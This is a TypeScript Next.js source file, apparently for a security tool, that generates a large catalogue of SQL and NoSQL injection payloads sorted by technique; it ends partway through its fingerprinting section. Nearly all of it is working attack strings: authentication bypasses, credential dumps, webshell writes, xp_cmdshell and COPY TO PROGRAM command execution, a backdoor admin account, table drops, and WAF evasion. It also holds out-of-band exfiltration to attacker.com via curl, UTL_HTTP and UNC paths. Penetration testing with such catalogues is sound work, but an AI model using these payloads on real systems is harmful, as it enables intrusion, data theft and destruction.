import { NextRequest, NextResponse } from "next/server";

type SQLiPayload = {
  label: string;
  payload: string;
  technique: string;
  dbms: string;
  risk: "low" | "medium" | "high" | "critical";
  description: string;
};

type SQLiCategory = {
  label: string;
  description: string;
  payloads: SQLiPayload[];
};

function generateSQLiPayloads(target: string): SQLiCategory[] {
  const param = target.trim() || "id";

  return [
    {
      label: "Authentication Bypass",
      description: "Bypass login forms and authentication checks",
      payloads: [
        { label: "Classic OR bypass", payload: `' OR '1'='1`, technique: "Boolean", dbms: "All", risk: "critical", description: "Classic auth bypass — always true condition" },
        { label: "Comment bypass", payload: `' OR 1=1--`, technique: "Boolean", dbms: "MySQL/MSSQL", risk: "critical", description: "Terminate query with comment, bypass password check" },
        { label: "Admin bypass", payload: `admin'--`, technique: "Comment", dbms: "MySQL/MSSQL", risk: "critical", description: "Login as admin without password" },
        { label: "Hash bypass", payload: `' OR 1=1 LIMIT 1--`, technique: "Boolean", dbms: "MySQL", risk: "critical", description: "Limit to first row — bypass hash comparison" },
        { label: "MSSQL bypass", payload: `' OR 1=1--`, technique: "Boolean", dbms: "MSSQL", risk: "critical", description: "MSSQL specific comment style" },
        { label: "Oracle bypass", payload: `' OR 1=1--`, technique: "Boolean", dbms: "Oracle", risk: "critical", description: "Oracle double-dash comment bypass" },
        { label: "Null byte bypass", payload: `admin'%00`, technique: "Null Byte", dbms: "PHP/MySQL", risk: "high", description: "Null byte injection to truncate query" },
        { label: "Double quote bypass", payload: `" OR "1"="1`, technique: "Boolean", dbms: "All", risk: "critical", description: "Double quote variant for apps using double quotes" },
        { label: "Wildcard bypass", payload: `' OR 'unusual'='unusual`, technique: "Boolean", dbms: "All", risk: "critical", description: "String comparison bypass with unusual value" },
        { label: "Hex admin bypass", payload: `' OR 0x61646d696e='admin`, technique: "Hex Encoding", dbms: "MySQL", risk: "critical", description: "Hex-encoded 'admin' to bypass string filters" },
        { label: "Unicode bypass", payload: `' OR 1=1\u002d\u002d`, technique: "Unicode", dbms: "All", risk: "high", description: "Unicode-encoded comment chars to bypass WAF" },
        { label: "Scipen bypass", payload: `' OR 1e0=1e0--`, technique: "Scientific", dbms: "All", risk: "high", description: "Scientific notation to bypass numeric comparison" },
      ],
    },
    {
      label: "Error-Based Extraction",
      description: "Extract data via database error messages",
      payloads: [
        { label: "MySQL extractvalue", payload: `' AND extractvalue(1,concat(0x7e,database()))--`, technique: "Error-Based", dbms: "MySQL", risk: "high", description: "Extract current database name via XML error" },
        { label: "MySQL updatexml", payload: `' AND updatexml(1,concat(0x7e,(SELECT version())),1)--`, technique: "Error-Based", dbms: "MySQL", risk: "high", description: "Extract MySQL version via updatexml error" },
        { label: "MySQL floor rand", payload: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`, technique: "Error-Based", dbms: "MySQL", risk: "high", description: "Extract DB name via duplicate key on FLOOR+RAND" },
        { label: "MySQL geometry", payload: `' AND GeometryCollection((select * from (select * from (select version())a)b))--`, technique: "Error-Based", dbms: "MySQL", risk: "high", description: "MySQL geometry error-based extraction" },
        { label: "MySQL JSON value", payload: `' AND JSON_VALUE('{"a":1}','$.b[0]')=(SELECT version())--`, technique: "Error-Based", dbms: "MySQL 8+", risk: "high", description: "JSON_VALUE type mismatch error leak" },
        { label: "MSSQL convert", payload: `' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`, technique: "Error-Based", dbms: "MSSQL", risk: "high", description: "Extract table names via MSSQL conversion error" },
        { label: "MSSQL xml path", payload: `' AND 1=(SELECT TOP 1 * FROM (SELECT 1 AS x FOR XML PATH(''),TYPE).value('.','NVARCHAR(MAX)') t)--`, technique: "Error-Based", dbms: "MSSQL", risk: "high", description: "XML PATH error-based extraction on MSSQL" },
        { label: "MSSQL openrowset", payload: `'; SELECT * FROM OPENROWSET('SQLOLEDB','uid=sa;pwd=;Network=DBMSSOCN;Address=attacker.com,80;timeout=4','select 1')--`, technique: "Error-Based", dbms: "MSSQL", risk: "critical", description: "OPENROWSET OOB via error message" },
        { label: "Oracle utl_inaddr", payload: `' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))--`, technique: "Error-Based", dbms: "Oracle", risk: "high", description: "Extract Oracle user via network error" },
        { label: "Oracle ctxsys", payload: `' AND ctxsys.drithsx.sn(user,(SELECT user FROM dual))=1--`, technique: "Error-Based", dbms: "Oracle", risk: "high", description: "Oracle CTXSYS error extraction" },
        { label: "PostgreSQL cast", payload: `' AND CAST((SELECT version()) AS int)--`, technique: "Error-Based", dbms: "PostgreSQL", risk: "high", description: "Extract PostgreSQL version via cast error" },
        { label: "PostgreSQL array", payload: `' AND 1=ANY(SELECT ARRAY[(SELECT version())])--`, technique: "Error-Based", dbms: "PostgreSQL", risk: "high", description: "Array type mismatch reveals version" },
        { label: "SQLite type err", payload: `' AND typeof(SELECT sqlite_version())='blob'--`, technique: "Error-Based", dbms: "SQLite", risk: "medium", description: "Type mismatch error to fingerprint SQLite" },
        { label: "MySQL polygon", payload: `' AND polygon((select * from (select * from (select version())a)b))--`, technique: "Error-Based", dbms: "MySQL", risk: "high", description: "MySQL spatial function error extraction" },
      ],
    },
    {
      label: "UNION-Based Extraction",
      description: "Extract data by appending UNION SELECT statements",
      payloads: [
        { label: "ORDER BY probe", payload: `' ORDER BY 1--`, technique: "UNION", dbms: "All", risk: "medium", description: "Detect column count — increment until error" },
        { label: "NULL union 2col", payload: `' UNION SELECT NULL,NULL--`, technique: "UNION", dbms: "All", risk: "medium", description: "2-column probe — adjust to match schema" },
        { label: "NULL union 3col", payload: `' UNION SELECT NULL,NULL,NULL--`, technique: "UNION", dbms: "All", risk: "medium", description: "3-column probe" },
        { label: "Version dump", payload: `' UNION SELECT NULL,@@version,NULL--`, technique: "UNION", dbms: "MySQL/MSSQL", risk: "high", description: "Extract database version" },
        { label: "Current DB", payload: `' UNION SELECT NULL,database(),NULL--`, technique: "UNION", dbms: "MySQL", risk: "high", description: "Extract current database name" },
        { label: "Current user", payload: `' UNION SELECT NULL,user(),NULL--`, technique: "UNION", dbms: "MySQL", risk: "high", description: "Extract current DB user" },
        { label: "All databases", payload: `' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--`, technique: "UNION", dbms: "MySQL", risk: "high", description: "List all accessible databases" },
        { label: "Table enum", payload: `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--`, technique: "UNION", dbms: "MySQL", risk: "high", description: "List all tables in current database" },
        { label: "Column enum", payload: `' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--`, technique: "UNION", dbms: "MySQL", risk: "high", description: "List columns of target table" },
        { label: "Credential dump", payload: `' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users--`, technique: "UNION", dbms: "MySQL", risk: "critical", description: "Dump username:password pairs" },
        { label: "File read", payload: `' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--`, technique: "UNION", dbms: "MySQL", risk: "critical", description: "Read server file via LOAD_FILE" },
        { label: "Into outfile", payload: `' UNION SELECT '<?php system($_GET[cmd]);?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--`, technique: "UNION", dbms: "MySQL", risk: "critical", description: "Write webshell via SELECT INTO OUTFILE" },
        { label: "MSSQL tables", payload: `' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--`, technique: "UNION", dbms: "MSSQL", risk: "high", description: "List MSSQL user tables" },
        { label: "MSSQL users", payload: `' UNION SELECT NULL,name,NULL FROM master..syslogins--`, technique: "UNION", dbms: "MSSQL", risk: "high", description: "Dump MSSQL login accounts" },
        { label: "Oracle tables", payload: `' UNION SELECT NULL,table_name,NULL FROM all_tables--`, technique: "UNION", dbms: "Oracle", risk: "high", description: "List all Oracle accessible tables" },
        { label: "PostgreSQL tables", payload: `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'--`, technique: "UNION", dbms: "PostgreSQL", risk: "high", description: "List PostgreSQL public schema tables" },
        { label: "Group concat dump", payload: `' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL FROM users--`, technique: "UNION", dbms: "MySQL", risk: "critical", description: "Dump all credentials in one row using GROUP_CONCAT" },
        { label: "Hex column detect", payload: `' UNION SELECT 0x41414141,0x42424242,0x43434343--`, technique: "UNION", dbms: "MySQL", risk: "medium", description: "Use hex strings to identify which columns are visible" },
      ],
    },
    {
      label: "Blind Boolean-Based",
      description: "Extract data through true/false application responses",
      payloads: [
        { label: "Basic true", payload: `' AND 1=1--`, technique: "Blind Boolean", dbms: "All", risk: "medium", description: "True condition — compare response with AND 1=2" },
        { label: "Basic false", payload: `' AND 1=2--`, technique: "Blind Boolean", dbms: "All", risk: "medium", description: "False condition — different response confirms blind SQLi" },
        { label: "Substring DB", payload: `' AND SUBSTRING(database(),1,1)='a'--`, technique: "Blind Boolean", dbms: "MySQL", risk: "high", description: "Extract DB name char by char" },
        { label: "Length detect", payload: `' AND LENGTH(database())>5--`, technique: "Blind Boolean", dbms: "MySQL", risk: "medium", description: "Detect database name length" },
        { label: "User detect", payload: `' AND (SELECT SUBSTRING(user(),1,1))='r'--`, technique: "Blind Boolean", dbms: "MySQL", risk: "high", description: "Extract MySQL user character by character" },
        { label: "Table existence", payload: `' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0--`, technique: "Blind Boolean", dbms: "MySQL", risk: "high", description: "Check if 'users' table exists" },
        { label: "MSSQL blind", payload: `' AND (SELECT TOP 1 SUBSTRING(name,1,1) FROM sysobjects WHERE xtype='U')='u'--`, technique: "Blind Boolean", dbms: "MSSQL", risk: "high", description: "MSSQL blind extraction from sysobjects" },
        { label: "Oracle blind", payload: `' AND (SELECT SUBSTR(username,1,1) FROM all_users WHERE ROWNUM=1)='S'--`, technique: "Blind Boolean", dbms: "Oracle", risk: "high", description: "Oracle blind char extraction from all_users" },
        { label: "PostgreSQL blind", payload: `' AND (SELECT SUBSTRING(usename,1,1) FROM pg_user LIMIT 1)='p'--`, technique: "Blind Boolean", dbms: "PostgreSQL", risk: "high", description: "PostgreSQL blind extraction from pg_user" },
        { label: "Bit-by-bit extract", payload: `' AND ORD(MID(database(),1,1))>64--`, technique: "Blind Boolean", dbms: "MySQL", risk: "high", description: "Binary search via ASCII ordinal — faster extraction" },
        { label: "Regex match", payload: `' AND database() REGEXP '^[a-m]'--`, technique: "Blind Boolean", dbms: "MySQL", risk: "high", description: "REGEXP for faster char-range detection" },
        { label: "LIKE pattern", payload: `' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) LIKE 'us%'--`, technique: "Blind Boolean", dbms: "MySQL", risk: "high", description: "LIKE pattern matching for table discovery" },
      ],
    },
    {
      label: "Time-Based Blind",
      description: "Infer data through deliberate response delays",
      payloads: [
        { label: "MySQL SLEEP", payload: `' AND SLEEP(5)--`, technique: "Time-Based", dbms: "MySQL", risk: "medium", description: "5-second delay confirms SQLi on MySQL" },
        { label: "MySQL IF sleep", payload: `' AND IF(1=1,SLEEP(5),0)--`, technique: "Time-Based", dbms: "MySQL", risk: "high", description: "Conditional sleep — exploitable for extraction" },
        { label: "MySQL char sleep", payload: `' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--`, technique: "Time-Based", dbms: "MySQL", risk: "high", description: "Extract DB name via timing" },
        { label: "MySQL benchmark", payload: `' AND BENCHMARK(5000000,MD5('test'))--`, technique: "Time-Based", dbms: "MySQL", risk: "medium", description: "CPU-based delay via BENCHMARK — no SLEEP needed" },
        { label: "MSSQL WAITFOR", payload: `'; WAITFOR DELAY '0:0:5'--`, technique: "Time-Based", dbms: "MSSQL", risk: "medium", description: "MSSQL 5-second delay via stacked query" },
        { label: "MSSQL conditional", payload: `'; IF (SELECT COUNT(*) FROM sysobjects WHERE name='users')>0 WAITFOR DELAY '0:0:5'--`, technique: "Time-Based", dbms: "MSSQL", risk: "high", description: "Conditional MSSQL delay for table existence check" },
        { label: "PostgreSQL sleep", payload: `'; SELECT pg_sleep(5)--`, technique: "Time-Based", dbms: "PostgreSQL", risk: "medium", description: "PostgreSQL 5-second delay" },
        { label: "PostgreSQL case", payload: `'; SELECT CASE WHEN (SELECT 1 FROM pg_user LIMIT 1)=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--`, technique: "Time-Based", dbms: "PostgreSQL", risk: "high", description: "Conditional PostgreSQL sleep for blind extraction" },
        { label: "Oracle PIPE recv", payload: `' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`, technique: "Time-Based", dbms: "Oracle", risk: "medium", description: "Oracle time-based via pipe message timeout" },
        { label: "Oracle DBMS_LOCK", payload: `' AND 1=DBMS_LOCK.SLEEP(5)--`, technique: "Time-Based", dbms: "Oracle", risk: "medium", description: "Oracle DBMS_LOCK sleep — requires privilege" },
        { label: "SQLite heavy query", payload: `' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master)>0--`, technique: "Time-Based", dbms: "SQLite", risk: "medium", description: "CPU delay via cross-join on sqlite_master" },
        { label: "MySQL heavy CPU", payload: `' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)>0 AND SLEEP(0)--`, technique: "Time-Based", dbms: "MySQL", risk: "medium", description: "Heavy CPU cross-join before SLEEP — detectable delay" },
      ],
    },
    {
      label: "Stacked Queries",
      description: "Inject multiple SQL statements via semicolon separation",
      payloads: [
        { label: "MSSQL stacked drop", payload: `'; DROP TABLE users--`, technique: "Stacked", dbms: "MSSQL", risk: "critical", description: "Destructive stacked query — drops users table" },
        { label: "MSSQL xp_cmdshell", payload: `'; EXEC xp_cmdshell('whoami')--`, technique: "Stacked", dbms: "MSSQL", risk: "critical", description: "OS command execution via xp_cmdshell" },
        { label: "MSSQL enable xpcmd", payload: `'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--`, technique: "Stacked", dbms: "MSSQL", risk: "critical", description: "Enable xp_cmdshell if disabled — full RCE chain" },
        { label: "MSSQL add user", payload: `'; EXEC sp_addlogin 'hacker','P@ss123'; EXEC sp_addsrvrolemember 'hacker','sysadmin'--`, technique: "Stacked", dbms: "MSSQL", risk: "critical", description: "Add sysadmin user via stacked query" },
        { label: "PostgreSQL copy", payload: `'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned.txt'--`, technique: "Stacked", dbms: "PostgreSQL", risk: "critical", description: "RCE via PostgreSQL COPY TO PROGRAM" },
        { label: "PostgreSQL create func", payload: `'; CREATE OR REPLACE FUNCTION rce(cmd text) RETURNS text AS $$ import os; return os.popen(cmd).read() $$ LANGUAGE plpython3u--`, technique: "Stacked", dbms: "PostgreSQL", risk: "critical", description: "Create Python UDF for RCE (requires plpython3u)" },
        { label: "MySQL multi stmt", payload: `'; INSERT INTO users(username,password) VALUES('hacker','hacked'); SELECT 1--`, technique: "Stacked", dbms: "MySQL (PDO)", risk: "critical", description: "Insert backdoor account via stacked query (PDO only)" },
        { label: "SQLite attach", payload: `'; ATTACH DATABASE '/var/www/html/shell.php' AS shell; CREATE TABLE shell.a (b TEXT); INSERT INTO shell.a VALUES('<?php system($_GET[c]);?>')--`, technique: "Stacked", dbms: "SQLite", risk: "critical", description: "Write PHP webshell via SQLite ATTACH DATABASE" },
        { label: "MSSQL bulk insert", payload: `'; BULK INSERT tempdb..temptable FROM '\\\\attacker.com\\share\\file.txt' WITH (ROWTERMINATOR='\\n')--`, technique: "Stacked", dbms: "MSSQL", risk: "critical", description: "NTLM credential capture via BULK INSERT UNC path" },
        { label: "MSSQL linked server", payload: `'; EXEC ('SELECT * FROM users') AT [192.168.1.100]--`, technique: "Stacked", dbms: "MSSQL", risk: "critical", description: "Pivot via MSSQL linked server execution" },
      ],
    },
    {
      label: "Second-Order SQLi",
      description: "Stored injection — payload stored, triggered later",
      payloads: [
        { label: "Username store", payload: `admin'--`, technique: "Second-Order", dbms: "All", risk: "critical", description: "Register username with SQLi — triggers on profile load/login" },
        { label: "Email store", payload: `attacker'@evil.com'--`, technique: "Second-Order", dbms: "All", risk: "high", description: "Inject via email field — payload fires on later query" },
        { label: "Profile bio store", payload: `' UNION SELECT 1,database(),3--`, technique: "Second-Order", dbms: "MySQL", risk: "high", description: "Store UNION payload in bio field — fires on profile view" },
        { label: "Search term store", payload: `%'; INSERT INTO logs SELECT * FROM users--`, technique: "Second-Order", dbms: "MySQL", risk: "critical", description: "Inject via search — payload fires in search history query" },
        { label: "Forgot password", payload: `'; UPDATE users SET password='hacked' WHERE '1'='1`, technique: "Second-Order", dbms: "All", risk: "critical", description: "Inject in forgot-password flow — fires on password reset query" },
        { label: "Order/product name", payload: `test' AND (SELECT SLEEP(5))='`, technique: "Second-Order", dbms: "MySQL", risk: "high", description: "Store time-based payload in order name — fires on order history view" },
        { label: "Cookie value store", payload: `' UNION SELECT username,password,3 FROM users--`, technique: "Second-Order", dbms: "MySQL", risk: "critical", description: "Inject via cookie decoded into DB — fires on session load" },
      ],
    },
    {
      label: "JSON & XML Injection",
      description: "Modern API endpoints using JSON/XML parameters",
      payloads: [
        { label: "JSON string inject", payload: `{"username":"admin'--","password":"x"}`, technique: "JSON", dbms: "All", risk: "critical", description: "SQLi via JSON body — auth bypass in REST API" },
        { label: "JSON boolean", payload: `{"id":"1 OR 1=1"}`, technique: "JSON", dbms: "All", risk: "high", description: "Numeric JSON param injection" },
        { label: "JSON UNION", payload: `{"search":"test' UNION SELECT NULL,database(),NULL--"}`, technique: "JSON", dbms: "MySQL", risk: "high", description: "UNION injection via JSON search parameter" },
        { label: "JSON sleep", payload: `{"id":"1'; SELECT SLEEP(5)--"}`, technique: "JSON", dbms: "MySQL", risk: "high", description: "Time-based blind via JSON parameter" },
        { label: "XML entity inject", payload: `<?xml version="1.0"?><user><name>' OR '1'='1</name></user>`, technique: "XML", dbms: "All", risk: "critical", description: "SQLi via XML body parsed into SQL query" },
        { label: "SOAP inject", payload: `<username>' OR 1=1--</username>`, technique: "XML/SOAP", dbms: "All", risk: "critical", description: "Auth bypass in SOAP web service" },
        { label: "GraphQL inject", payload: `{ user(id: "1 UNION SELECT username,password FROM users-- ") { name } }`, technique: "GraphQL", dbms: "MySQL", risk: "high", description: "SQLi via GraphQL argument — unsanitized resolver" },
        { label: "JSON nested", payload: `{"filter":{"name":"' OR 1=1--"}}`, technique: "JSON", dbms: "All", risk: "high", description: "Inject via nested JSON object parameter" },
        { label: "JSON array", payload: `{"ids":["1","2 UNION SELECT NULL,database(),NULL--"]}`, technique: "JSON", dbms: "MySQL", risk: "high", description: "Inject into JSON array element processed in IN() clause" },
        { label: "XML CDATA bypass", payload: `<![CDATA[' OR '1'='1]]>`, technique: "XML", dbms: "All", risk: "high", description: "CDATA section bypass for XML-aware WAFs" },
      ],
    },
    {
      label: "NoSQL Injection",
      description: "MongoDB, CouchDB, and NoSQL operator injection",
      payloads: [
        { label: "MongoDB OR", payload: `{"username":{"$gt":""},"password":{"$gt":""}}`, technique: "NoSQL", dbms: "MongoDB", risk: "critical", description: "MongoDB auth bypass using $gt operator" },
        { label: "MongoDB regex", payload: `{"username":{"$regex":".*"},"password":{"$regex":".*"}}`, technique: "NoSQL", dbms: "MongoDB", risk: "critical", description: "Regex wildcard match — bypass authentication" },
        { label: "MongoDB where", payload: `{"$where":"this.username=='admin'"}`, technique: "NoSQL", dbms: "MongoDB", risk: "critical", description: "JavaScript $where injection in MongoDB" },
        { label: "MongoDB ne", payload: `{"username":{"$ne":""},"password":{"$ne":""}}`, technique: "NoSQL", dbms: "MongoDB", risk: "critical", description: "Not-equal operator to match any non-empty value" },
        { label: "MongoDB sleep", payload: `{"$where":"function(){var d=new Date(); while(new Date()-d<5000){} return true;}"}`, technique: "NoSQL", dbms: "MongoDB", risk: "high", description: "Time-based blind via JavaScript sleep in $where" },
        { label: "MongoDB exists", payload: `{"username":{"$exists":true},"password":{"$exists":true}}`, technique: "NoSQL", dbms: "MongoDB", risk: "high", description: "$exists operator to match any document with these fields" },
        { label: "CouchDB injection", payload: `{"selector":{"$or":[{"type":"user"},{"type":"admin"}]}}`, technique: "NoSQL", dbms: "CouchDB", risk: "high", description: "CouchDB Mango query injection via $or" },
        { label: "Redis inject", payload: `KEYS *`, technique: "NoSQL", dbms: "Redis", risk: "high", description: "Redis command injection — lists all keys" },
        { label: "ElasticSearch inject", payload: `{"query":{"bool":{"must":[{"match_all":{}}]}}}`, technique: "NoSQL", dbms: "ElasticSearch", risk: "high", description: "ElasticSearch match_all to bypass query filters" },
        { label: "MongoDB type juggle", payload: `{"username":"admin","password":{"$gt":0}}`, technique: "NoSQL", dbms: "MongoDB", risk: "critical", description: "Type juggling — integer $gt compared to string password" },
      ],
    },
    {
      label: "WAF Evasion",
      description: "Bypass Web Application Firewall detection",
      payloads: [
        { label: "Case variation", payload: `' uNiOn SeLeCt NULL,database(),NULL--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "Mixed case to bypass case-sensitive WAF rules" },
        { label: "Comment fragmentation", payload: `' UN/**/ION SE/**/LECT NULL,database(),NULL--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "Inline comments break keyword detection" },
        { label: "Double URL encode", payload: `%2527%2520OR%25201%253D1--`, technique: "WAF Bypass", dbms: "All", risk: "high", description: "Double URL encoding to bypass WAF decoding" },
        { label: "Tab whitespace", payload: `'%09OR%091=1--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "Tab instead of space to bypass space filtering" },
        { label: "Newline bypass", payload: `'\nOR\n1=1--`, technique: "WAF Bypass", dbms: "All", risk: "high", description: "Newline chars split keywords across lines" },
        { label: "Hex encoding", payload: `' OR 0x313d31--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "Hex-encoded payload to bypass string detection" },
        { label: "CHAR() bypass", payload: `' OR CHAR(49)=CHAR(49)--`, technique: "WAF Bypass", dbms: "MySQL/MSSQL", risk: "high", description: "CHAR() function avoids literal string filtering" },
        { label: "Versioned comment", payload: `' /*!50000UNION*/ /*!50000SELECT*/ NULL,database(),NULL--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "MySQL versioned comments bypass keyword detection" },
        { label: "Null byte split", payload: `' OR%001=1--`, technique: "WAF Bypass", dbms: "All", risk: "high", description: "Null byte between keyword chars fools some WAFs" },
        { label: "Unicode fullwidth", payload: `\uff07 OR \uff11=\uff11--`, technique: "WAF Bypass", dbms: "All", risk: "high", description: "Unicode fullwidth chars bypass ASCII-only WAF rules" },
        { label: "HTTP param pollution", payload: `id=1&id=' UNION SELECT NULL,database(),NULL--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "Duplicate param — WAF checks first, backend uses last" },
        { label: "Scientific notation", payload: `' OR 1.0e0=1.0e0--`, technique: "WAF Bypass", dbms: "All", risk: "medium", description: "Scientific notation numeric comparison bypasses filters" },
        { label: "Base64 payload", payload: `' UNION SELECT FROM_BASE64('c2VsZWN0IHZlcnNpb24oKQ==')--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "Decode base64 inside query to bypass signature detection" },
        { label: "E notation", payload: `' OR 0e0=0--`, technique: "WAF Bypass", dbms: "MySQL", risk: "high", description: "MySQL treats 0e0 as float 0 — bypasses integer-only filters" },
      ],
    },
    {
      label: "Polyglot Payloads",
      description: "Single payload effective across multiple DBMS",
      payloads: [
        { label: "Universal polyglot", payload: `SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/`, technique: "Polyglot", dbms: "All", risk: "high", description: "Works in MySQL with single/double quotes and comment variants" },
        { label: "Auth bypass polyglot", payload: `';--`, technique: "Polyglot", dbms: "All", risk: "critical", description: "Quote + semicolon + comment — terminates query in most DBMS" },
        { label: "UNION polyglot", payload: `' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--+`, technique: "Polyglot", dbms: "MySQL/MSSQL", risk: "high", description: "UNION with ALL keyword + --+ comment style" },
        { label: "Time polyglot", payload: `1;SELECT%20SLEEP(5)--/*'XOR(SELECT%20SLEEP(5))OR'*/`, technique: "Polyglot", dbms: "MySQL", risk: "high", description: "Multiple time-delay vectors in one payload" },
        { label: "Multicontext polyglot", payload: `/*'/*\`/*\"/*^/**/OR 1=1--`, technique: "Polyglot", dbms: "All", risk: "critical", description: "Closes string in multiple quote contexts simultaneously" },
        { label: "Login polyglot", payload: `' OR 1-- -`, technique: "Polyglot", dbms: "MySQL/SQLite", risk: "critical", description: "Space after -- prevents comment stripping by some parsers" },
        { label: "Stacked polyglot", payload: `'); SELECT pg_sleep(5); -- /*' AND SLEEP(5) AND ('1'='1`, technique: "Polyglot", dbms: "PostgreSQL/MySQL", risk: "high", description: "Polyglot covering PostgreSQL stacked + MySQL sleep" },
        { label: "JSON polyglot", payload: `{"id":"1 OR 1=1/*' OR '1'='1"}`, technique: "Polyglot", dbms: "All", risk: "high", description: "JSON-wrapped polyglot for API + traditional endpoints" },
      ],
    },
    {
      label: "Truncation & Encoding Attacks",
      description: "Max-length bypass and multi-layer encoding chains",
      payloads: [
        { label: "Truncation bypass", payload: `admin                                                  '-- `, technique: "Truncation", dbms: "MySQL", risk: "critical", description: "Pad username to max length — trailing quote truncated by DB" },
        { label: "Double encode OR", payload: `%2527+OR+1%253D1--`, technique: "Multi-Encode", dbms: "All", risk: "high", description: "Double URL-encoded OR 1=1 bypasses single-decode WAFs" },
        { label: "HTML entity encode", payload: `&apos; OR 1=1--`, technique: "HTML Encode", dbms: "All", risk: "high", description: "HTML entity for quote — bypasses HTML-context WAFs" },
        { label: "Unicode normalize", payload: `\u02bc OR 1=1--`, technique: "Unicode", dbms: "All", risk: "high", description: "Unicode modifier letter apostrophe normalized to quote" },
        { label: "UTF-16 payload", payload: `\x00'\x00 \x00O\x00R\x00 \x001\x00=\x001--`, technique: "Encoding", dbms: "All", risk: "high", description: "UTF-16 encoded payload for wide-char DB drivers" },
        { label: "Overlong UTF-8", payload: `\xc0\x27 OR 1=1--`, technique: "Encoding", dbms: "MySQL", risk: "high", description: "Overlong UTF-8 single quote — bypasses byte-level filters" },
        { label: "ROT13 comment", payload: `' BE 1=1--`, technique: "Encoding", dbms: "None", risk: "low", description: "ROT13 of 'OR' — for fingerprinting naive text filters" },
        { label: "Multi-encode chain", payload: `%25%32%37%20OR%20%31%3D%31--`, technique: "Multi-Encode", dbms: "All", risk: "high", description: "Triple-encoded quote + OR 1=1 bypass chain" },
      ],
    },
    {
      label: "Out-of-Band (OOB) Exfiltration",
      description: "Exfiltrate data via DNS or HTTP callback channels",
      payloads: [
        { label: "MySQL DNS via LOAD_FILE", payload: `' AND LOAD_FILE(concat('\\\\\\\\',database(),'.attacker.com\\\\a'))--`, technique: "OOB DNS", dbms: "MySQL", risk: "critical", description: "DNS exfiltration via UNC path in LOAD_FILE (Windows)" },
        { label: "MySQL into dumpfile", payload: `' UNION SELECT database() INTO DUMPFILE '/tmp/out.txt'--`, technique: "OOB File", dbms: "MySQL", risk: "critical", description: "Write exfiltrated data to server temp file" },
        { label: "MSSQL xp_dirtree DNS", payload: `'; EXEC master..xp_dirtree '\\\\'+database()+'.attacker.com\\a'--`, technique: "OOB DNS", dbms: "MSSQL", risk: "critical", description: "DNS lookup via xp_dirtree with data in subdomain" },
        { label: "MSSQL xp_fileexist", payload: `'; EXEC master..xp_fileexist '\\\\attacker.com\\'+@@version--`, technique: "OOB DNS", dbms: "MSSQL", risk: "critical", description: "NTLM capture + version leak via xp_fileexist UNC" },
        { label: "MSSQL openrowset", payload: `'; SELECT * FROM OPENROWSET('SQLOLEDB','uid=sa;Network=DBMSSOCN;Address=attacker.com,80;timeout=4','select 1')--`, technique: "OOB HTTP", dbms: "MSSQL", risk: "critical", description: "HTTP callback via OPENROWSET to external server" },
        { label: "PostgreSQL COPY HTTP", payload: `'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/'||(SELECT version())--`, technique: "OOB HTTP", dbms: "PostgreSQL", risk: "critical", description: "HTTP OOB exfiltration via COPY TO PROGRAM + curl" },
        { label: "Oracle UTL_HTTP", payload: `' AND utl_http.request('http://attacker.com/'||(SELECT user FROM dual)) IS NOT NULL--`, technique: "OOB HTTP", dbms: "Oracle", risk: "critical", description: "HTTP OOB exfiltration via Oracle UTL_HTTP" },
        { label: "Oracle UTL_FILE", payload: `' AND utl_file.put_line(utl_file.fopen('DIR','out.txt','W'),(SELECT user FROM dual)) IS NOT NULL--`, technique: "OOB File", dbms: "Oracle", risk: "critical", description: "Write data to server file via Oracle UTL_FILE" },
        { label: "MySQL HTTP via UDF", payload: `' UNION SELECT sys_exec('curl http://attacker.com/?d='||database())--`, technique: "OOB HTTP", dbms: "MySQL+UDF", risk: "critical", description: "HTTP exfiltration via MySQL UDF sys_exec (lib_mysqludf)" },
        { label: "DNS rebinding chain", payload: `' AND (SELECT LOAD_FILE(concat(0x5c5c5c5c,(SELECT hex(database())),0x2e,0x61747461636b65722e636f6d,0x5c5c61)))--`, technique: "OOB DNS", dbms: "MySQL", risk: "critical", description: "Hex-encoded database name in DNS subdomain via LOAD_FILE" },
      ],
    },
    {
      label: "Detection & Fingerprinting",
      description: "Identify database type, version, and configuration",
      payloads: [
        { label: "Generic probe", payload: `'`, technique: "Fingerprint", dbms: "All", risk: "low", description: "Single quote — basic error trigger for any DBMS" },
        { label: "MySQL check", payload: `' AND '1'=CONVERT(1,CHAR)--`, technique: "Fingerprint", dbms: "MySQL", risk: "low", description: "MySQL-specific CONVERT syntax fingerprint" },
